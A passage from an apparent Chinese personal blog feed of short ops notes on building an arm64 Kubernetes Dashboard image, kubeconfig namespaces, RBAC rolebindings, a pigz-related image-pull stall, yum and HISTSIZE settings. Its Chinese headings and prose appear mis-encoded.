class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">############################ 1.ä¸‹è½½ä»“åº“ ############################</span><br>[root@ningan ~]<span class="hljs-comment"># pwd</span><br>/root<br><br>[root@ningan ~]<span class="hljs-comment"># git clone https://github.com/kubernetes/dashboard.git</span><br>Cloning into <span class="hljs-string">&#x27;dashboard&#x27;</span>...<br>remote: Enumerating objects: 95919, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (445/445), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (167/167), <span class="hljs-keyword">done</span>.<br>remote: Total 95919 (delta 307), reused 401 (delta 274), pack-reused 95474<br>Receiving objects: 100% (95919/95919), 183.17 MiB | 5.84 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (56815/56815), <span class="hljs-keyword">done</span>.<br><br><span class="hljs-comment">############################ 2.æ‰¾åˆ°mainå‡½æ•° ############################</span><br>[root@ningan ~]<span class="hljs-comment"># cd dashboard</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># git checkout v2.4.0</span><br>Note: checking out <span class="hljs-string">&#x27;v2.4.0&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by performing another checkout.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -b with the checkout <span class="hljs-built_in">command</span> again. Example:<br><br>  git checkout -b &lt;new-branch-name&gt;<br><br>HEAD is now at e75ebcf68 Prepare <span class="hljs-keyword">for</span> v2.4.0 release (<span class="hljs-comment">#6536)</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># ls</span><br>aio           code-of-conduct.md  cypress       docs    go.sum             i18n     license-checker-config.json  OWNERS_ALIASES  package-lock.json  ROLES.md           SECURITY.md  tsconfig.json<br>angular.json  CONTRIBUTING.md     cypress.json  go.mod  gulpfile.babel.js  LICENSE  OWNERS                       package.json    README.md          SECURITY_CONTACTS  src<br>[root@ningan dashboard]<span class="hljs-comment">#</span><br>[root@ningan dashboard]<span class="hljs-comment"># cd src</span><br>[root@ningan src]<span class="hljs-comment"># ls</span><br>app<br>[root@ningan src]<span class="hljs-comment"># cd app/</span><br>[root@ningan app]<span class="hljs-comment"># ls</span><br>backend  frontend<br>[root@ningan app]<span class="hljs-comment"># cd backend/</span><br>[root@ningan backend]<span class="hljs-comment"># ls</span><br>api  args  auth  cert  client  dashboard.go  errors  handler  integration  plugin  resource  scaling  settings  <span class="hljs-built_in">sync</span>  systembanner  validation<br>[root@ningan backend]<span class="hljs-comment">#</span><br><br><br><span class="hljs-comment">############################ 3.ç¼–è¯‘armäºŒè¿›åˆ¶ ############################</span><br>[root@ningan backend]<span class="hljs-comment"># GOOS=linux GOARCH=arm64 go build  -o bin/dashboard-arm ./dashboard.go</span><br>[root@ningan backend]<span class="hljs-comment">#</span><br>[root@ningan backend]<span class="hljs-comment"># cd bin</span><br>[root@ningan bin]<span class="hljs-comment"># ll</span><br>total 49880<br>drwxr-xr-x  2 root root     4096 Jul 13 15:36 ./<br>drwxr-xr-x 18 root root     4096 Jul 13 15:36 ../<br>-rwxr-xr-x  1 root root 51063857 Jul 13 15:36 dashboard-arm*<br><br><br><span class="hljs-comment">############################ 4.ç¼–å†™Dockerfile ############################</span><br>[root@ningan bin]<span class="hljs-comment"># cat Dockerfilearm</span><br>FROM xxx   <span class="hljs-comment"># æ­¤å¤„å†™æˆè‡ªå·±çš„ä¸€ä¸ªarmåŸºç¡€é•œåƒ</span><br><br>ADD ./dashboard-arm /dashboard<br>USER root<br>EXPOSE 8443 9090<br>ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br><br><span class="hljs-comment">############################ 5.æ„å»ºé•œåƒ ############################</span><br>[root@ningan bin]<span class="hljs-comment"># docker build -t dashboard:v2.4.0-arm64 . -f Dockerfilearm</span><br>Sending build context to Docker daemon  51.07MB<br>Step 1/5 : FROM xxx/istio/csm_stg/src_image_build/base_go:1.16<br> ---&gt; 3ad4565d534b<br>Step 2/5 : ADD ./dashboard-arm /dashboard<br> ---&gt; 7e3d77933b5a<br>Step 3/5 : USER root<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in 2d9408e745f1</span><br><span class="hljs-string">Removing intermediate container 2d9408e745f1</span><br><span class="hljs-string"> ---&gt; 177800207a1e</span><br><span class="hljs-string">Step 4/5 : EXPOSE 8443 9090</span><br><span class="hljs-string"> ---&gt; [Warning] The requested image&#x27;</span>s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested<br> ---&gt; Running <span class="hljs-keyword">in</span> 932853d116b3<br>Removing intermediate container 932853d116b3<br> ---&gt; 7ea9c1c8d5e5<br>Step 5/5 : ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in ce7ee0cc5586</span><br><span class="hljs-string">Removing intermediate container ce7ee0cc5586</span><br><span class="hljs-string"> ---&gt; e14cdf3553f3</span><br><span class="hljs-string">Successfully built e14cdf3553f3</span><br><span class="hljs-string">Successfully tagged dashboard:v2.4.0-arm64</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">############################ 6.æµ‹è¯• ############################</span><br><span class="hljs-string">å¯åŠ¨æ˜¯å¯ä»¥æˆåŠŸå¯åŠ¨äº†ï¼Œä½†æ˜¯ä¸€ç›´é‡å¯ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202307) kubeconfigæŒ‡å®šns</title>
    <link href="/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20kubeconfig%E6%8C%87%E5%AE%9Ans/"/>
    <url>/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20kubeconfig%E6%8C%87%E5%AE%9Ans/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">apiVersion: v1<br>clusters:<br>- cluster:<br>    certificate-authority-data: xxxx<br>    server: xxx<br>  name: kubernetes<br>contexts:<br>- context:<br>    cluster: kubernetes<br>    user: system:admin<br>    namespace: default             <span class="hljs-comment">### åœ¨æ­¤å¤„æ·»åŠ </span><br>  name: system:admin<br>current-context: system:admin<br>kind: Config<br>preferences: &#123;&#125;<br><span class="hljs-built_in">users</span>:<br>- name: system:admin<br>  user:<br>    client-certificate-data: xxx<br>    client-key-data: xxx<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202307) åˆ›å»ºä¸€ä¸ªé™å®šnsçš„æœ€å¤§æƒé™</title>
    <link href="/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%99%90%E5%AE%9Ans%E7%9A%84%E6%9C%80%E5%A4%A7%E6%9D%83%E9%99%90/"/>
    <url>/2023/07/07/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202307)%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%99%90%E5%AE%9Ans%E7%9A%84%E6%9C%80%E5%A4%A7%E6%9D%83%E9%99%90/</url>
    
    <content type="html"><![CDATA[<p>ç»‘åˆ°cluster-adminä¸Šé¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl get clusterrole -A |grep admin</span><br>admin                                                                  2023-06-14T09:22:20Z<br>cluster-admin                                                          2023-06-14T09:22:20Z<br>system:aggregate-to-admin                                              2023-06-14T09:22:20Z<br>system:kubelet-api-admin                                               2023-06-14T09:22:20Z<br><br><br><br><span class="hljs-comment"># kubectl create rolebinding  xxx --clusterrole=cluster-admin --serviceaccount=xx --namespace=xx</span><br>rolebinding.rbac.authorization.k8s.io/xx created<br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/aresxin/p/k8s-sc.html">K8Sæƒé™æ§åˆ¶ï¼Œé™åˆ¶ç”¨æˆ·åœ¨å¤šä¸ªnamespaceä¸Šçš„è®¿é—®æƒé™</a><br><a href="https://juejin.cn/post/7221147640491098169"># Kubernetes å¦‚ä½•é™åˆ¶ä¸åŒçš„å›¢é˜Ÿåªèƒ½è®¿é—®å„è‡ªçš„ namespaceï¼Ÿ</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdé”™è¯¯è§£å†³ç³»åˆ—ã€‘(202307)uos armä¸»æœºdockeråŠcontainerdéƒ½æ‹‰ä¸ä¸‹æ¥é•œåƒ</title>
    <link href="/2023/07/07/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202307)uos%20arm%E4%B8%BB%E6%9C%BAdocker%E5%8F%8Acontainerd%E9%83%BD%E6%8B%89%E4%B8%8D%E4%B8%8B%E6%9D%A5%E9%95%9C%E5%83%8F/"/>
    <url>/2023/07/07/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202307)uos%20arm%E4%B8%BB%E6%9C%BAdocker%E5%8F%8Acontainerd%E9%83%BD%E6%8B%89%E4%B8%8D%E4%B8%8B%E6%9D%A5%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># top</span><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230707101601.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># pstree -sp  27057</span><br>systemd(1)â”€â”¬â”€NetworkManager(2023)â”€â”¬â”€&#123;NetworkManager&#125;(2024)<br>           â”‚                      â””â”€&#123;NetworkManager&#125;(2025)<br>           â”œâ”€agetty(2742)<br>           â”œâ”€atd(2721)<br>           â”œâ”€avahi-daemon(1535)â”€â”€â”€avahi-daemon(1963)<br>           â”œâ”€chronyd(1616)<br>           â”œâ”€crond(2717)<br>           â”œâ”€cupsd(2446)<br>           â”œâ”€dbus-daemon(1524)<br>           â”œâ”€dhclient(2644)<br>           â”œâ”€dockerd(26518)â”€â”¬â”€containerd(26544)â”€â”¬â”€&#123;containerd&#125;(26545)<br>           â”‚                â”‚                   â”œâ”€&#123;containerd&#125;(26546)<br>           â”‚                â”‚                   â”œâ”€&#123;containerd&#125;(26547)<br>...<br>           â”‚                â”œâ”€exe(27059)â”€â”¬â”€&#123;exe&#125;(27063)<br>           â”‚                â”‚            â”œâ”€&#123;exe&#125;(27064)<br>           â”‚                â”‚            â”œâ”€&#123;exe&#125;(27065)<br>...<br>           â”‚                â”œâ”€unpigz(27057)â”€â”¬â”€&#123;unpigz&#125;(27060)<br>           â”‚                â”‚               â”œâ”€&#123;unpigz&#125;(27061)<br>           â”‚                â”‚               â””â”€&#123;unpigz&#125;(27062)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kill -9 27057</span><br><span class="hljs-comment"># docker pull xxx</span><br>xxx: Pulling from xxx<br>0ce1dd7918a4: Extracting [&gt;                                                  ]  32.77kB/2.827MB<br>c3268f83bb2a: Download complete <br>d9df37ecafc7: Download complete <br>58314a0280f3: Download complete <br>1374301702f0: Download complete <br>de4ca8f4f0e5: Download complete <br>0324a5263b9e: Verifying Checksum <br>f2c38dbf6aeb: Download complete <br>b991a5cc3e08: Download complete <br>5bd991751008: Download complete <br>4f4fb700ef54: Download complete <br>16f345ae53d4: Download complete <br>0f91d7e86c83: Download complete <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># rpm -qf /bin/unpigz</span><br>pigz-2.4-7.uelc20.01.aarch64<br><br><span class="hljs-comment"># yum remove pigz</span><br><span class="hljs-comment"># rpm -qf /bin/unpigz</span><br>error: file /bin/unpigz: No such file or directory<br><br><br>docker pull xxx<br>crictl pull xxx<br></code></pre></td></tr></table></figure><p>åˆ é™¤äº†è¿™ä¸ªåŒ…å°±å¯ä»¥äº†ï¼Œå…·ä½“è¯´æ˜å‚è€ƒä¸‹é¢çš„æ–‡æ¡£</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/alex_yangchuansheng/article/details/130278731">è§£å†³å›½äº§ç³»ç»Ÿ Docker æ‹‰å–å¤§é•œåƒå¡é¡¿ä¹‹è°œ</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è™šæ‹Ÿæœºã€‘hyper-vä¸­ubuntu18.04å¼€æœºå¡åœ¨å¯åŠ¨ç•Œé¢</title>
    <link href="/2023/06/30/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%ADubuntu18.04%E5%BC%80%E6%9C%BA%E5%8D%A1%E5%9C%A8%E5%90%AF%E5%8A%A8%E7%95%8C%E9%9D%A2/"/>
    <url>/2023/06/30/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%ADubuntu18.04%E5%BC%80%E6%9C%BA%E5%8D%A1%E5%9C%A8%E5%90%AF%E5%8A%A8%E7%95%8C%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230630012815.png" alt="image.png"></p><p>Alt + F2  æˆ–è€… Alt + Fn + F2</p><p>è¿›å»åˆ å‡ ä¸ªå¤§æ–‡ä»¶å°±å¯ä»¥å•¦~</p><p><a href="https://askubuntu.com/questions/1033613/start-job-is-running-for-hold-until-boot-process-finishes-up-18-04"># <a href="https://askubuntu.com/questions/1033613/start-job-is-running-for-hold-until-boot-process-finishes-up-18-04">Start job is running for hold until boot process finishes up 18.04</a></a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘å¸¸è§ç½‘ç»œåŒ…</title>
    <link href="/2023/06/19/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%8C%85/"/>
    <url>/2023/06/19/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th align="left"></th><th align="left">centos</th><th align="left">ubuntu</th></tr></thead><tbody><tr><td align="left">dig nslookup</td><td align="left">yum install -y bind-utils</td><td align="left"></td></tr><tr><td align="left">telnet</td><td align="left">yum install -y telnet</td><td align="left"></td></tr><tr><td align="left"><font face="??, Bookerly, éœé¹œæ–‡æ¥· GB, LXGW WenKai, Segoe UI Emoji, ??, ??, ??, Inter, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Microsoft YaHei, sans-serif"><span style="letter-spacing: 0.45px;">ifconfig route arp netstat</span></font><br></td><td align="left"><font face="??, Bookerly, éœé¹œæ–‡æ¥· GB, LXGW WenKai, Segoe UI Emoji, ??, ??, ??, Inter, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica, Arial, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Microsoft YaHei, sans-serif"><span style="letter-spacing: 0.45px;">net-tools</span></font><br></td><td align="left"></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202306)å¸¸ç”¨å‘½ä»¤ï¼šyum</title>
    <link href="/2023/06/15/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Ayum/"/>
    <url>/2023/06/15/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%EF%BC%9Ayum/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum clean all<br>yum makecache<br>yum list --showduplicates  | grep libseccomp<br>yum install --downloadonly --downloaddir . libseccomp<br>yum install --downloadonly --downloaddir . libseccomp*<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp</span><br>Last metadata expiration check: 0:01:35 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                           Architecture                   Version                                      Repository                                    Size<br>==================================================================================================================================================================<br>Upgrading:<br> libseccomp                        aarch64                        2.5.2-1.0.4.uelc20.01                        UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Upgrade  1 Package<br><br>Total download size: 69 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: N<br>Operation aborted.<br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp*</span><br>Last metadata expiration check: 0:01:46 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                               Architecture                Version                                     Repository                                    Size<br>==================================================================================================================================================================<br>Installing:<br> libseccomp-devel                      aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-AppStream                      56 k<br> libseccomp-static                     aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-Plus                           67 k<br>Upgrading:<br> libseccomp                            aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Install  2 Packages<br>Upgrade  1 Package<br><br>Total download size: 192 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: y<br>Downloading Packages:<br>(1/3): libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                                34 MB/s |  69 kB     00:00    <br>(2/3): libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                         3.1 MB/s |  56 kB     00:00    <br>(3/3): libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                        286 kB/s |  67 kB     00:00    <br>------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>Total                                                                                                                             822 kB/s | 192 kB     00:00     <br>Complete!<br>The downloaded packages were saved <span class="hljs-keyword">in</span> cache until the next successful transaction.<br>You can remove cached packages by executing <span class="hljs-string">&#x27;yum clean packages&#x27;</span>.<br><br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># ll</span><br>total 200<br>-rw-r----- 1 root root 71080 Jun 15 14:23 libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 57748 Jun 15 14:23 libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 68128 Jun 15 14:23 libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202306) ä¿®æ”¹historyæ¡æ•°</title>
    <link href="/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%20%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/"/>
    <url>/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%20%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo $HISTSIZE</span><br>5<br><span class="hljs-comment"># sed -i &#x27;s/^HISTSIZE=5/HISTSIZE=200/&#x27; /etc/profile</span><br><span class="hljs-comment"># source /etc/profile  </span><br><span class="hljs-comment"># echo $HISTSIZE</span><br>200<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202306)ä¿®æ”¹historyæ¡æ•°</title>
    <link href="/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/"/>
    <url>/2023/06/12/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202306)%E4%BF%AE%E6%94%B9history%E6%9D%A1%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo $HISTSIZE</span><br>5<br><span class="hljs-comment"># sed -i &#x27;s/^HISTSIZE=5/HISTSIZE=200/&#x27; /etc/profile</span><br><span class="hljs-comment"># source /etc/profile  </span><br><span class="hljs-comment"># echo $HISTSIZE</span><br>200<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€cueã€‘test2</title>
    <link href="/2023/06/07/cue/unsupported/%E3%80%90cue%E3%80%91test2/"/>
    <url>/2023/06/07/cue/unsupported/%E3%80%90cue%E3%80%91test2/</url>
    
    <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> SelfNodeVariable.regionImageRegistryResolution &#123;<br>       <br>       &#123;<br>           data: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">           test3.host</span><br><span class="hljs-string">           &quot;&quot;&quot;</span><br>           mode: <span class="hljs-string">&quot;0755&quot;</span><br>           path: <span class="hljs-string">&quot;test&quot;</span><br>       &#125;<br>     &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€goè¯­è¨€ç³»åˆ—ã€‘æ•°ç»„ åˆ‡ç‰‡ map</title>
    <link href="/2023/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E6%95%B0%E7%BB%84%20%E5%88%87%E7%89%87%20map/"/>
    <url>/2023/05/22/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E6%95%B0%E7%BB%84%20%E5%88%87%E7%89%87%20map/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
  </entry>
  
